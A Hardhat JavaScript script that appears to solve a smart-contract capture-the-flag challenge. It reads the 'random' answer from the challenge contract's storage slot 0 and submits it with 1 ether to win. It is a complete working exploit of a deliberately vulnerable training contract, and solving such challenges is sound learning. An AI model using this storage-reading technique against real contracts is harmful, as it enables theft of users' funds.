const { ethers } = require("hardhat");

async function main() {
  const randomNumber = await ethers.getContractAt(
    "GuessTheRandomNumberChallenge",
    "0x67efAE83aE60607AF787e53915fBB05AcD5A8d9E"
  );

  // Potential Alternative: see if theres a way to convert hash bytes to uint8
  // using ethers?
  // const deployBlock = 11368120;
  // const block = await ethers.provider.getBlock(deployBlock);
  // const answerBytes = ethers.utils.keccak256(block.parentHash, block.timestamp);
  // const [answer] = ethers.utils.defaultAbiCoder.decode(["uint8"], answerBytes);

  const storedNum = await ethers.provider.getStorageAt(randomNumber.address, 0);

  await randomNumber
    .guess(storedNum, {
      value: ethers.utils.parseEther("1"),
    })
    .then((tx) => tx.wait());

  console.log("isComplete:", await randomNumber.isComplete());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
